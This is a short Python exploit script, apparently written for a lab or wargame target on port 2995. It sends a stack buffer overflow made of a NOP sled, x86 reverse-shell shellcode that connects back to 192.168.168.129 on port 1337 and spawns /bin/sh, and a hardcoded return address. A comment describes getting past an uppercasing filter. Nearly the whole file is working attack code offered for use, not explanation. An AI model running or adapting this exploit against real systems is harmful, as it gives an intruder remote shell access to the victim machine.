#!/usr/bin/python

'''
Technique: Execute shellcode on stack

'''



import struct
import argparse
import sys
import os
import socket
import telnetlib
import binascii
socketObject = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socketObject.connect((sys.argv[1],2995))


#ip_of_the_remote_host
# make sure the remote host is listening -> nc -l -p 1337. Can customize the port number as well (defaults to 1337 by changing to shellcode)
IPv4="192.168.168.129"
hex_string=binascii.hexlify(socket.inet_aton(IPv4))
ip_network_byte_order=hex_string.decode("hex") #converting to string of hex bytes decode: interpret bytes in a certain format and convert it to strings

shellcode="\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68"+ip_network_byte_order+"\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"


#crafting the exploit (offset of EIP is at 532, gets needs to be stopped at some index beyond which code will get uppercased)
buf=""
buf+="tabs\r" #tabs break the gets function, hence preventing our shellcode from "toupper"
buf+="\x90"*100
buf+=shellcode
buf+="\x90"*(532 - len(shellcode) - 100 - 5)
print(len(buf))
buf+="\x80\xfa\xff\xbf" + "\n"

socketObject.send(buf)
#No need to receive as the exploit should connect back at 1337
socketObject.close()
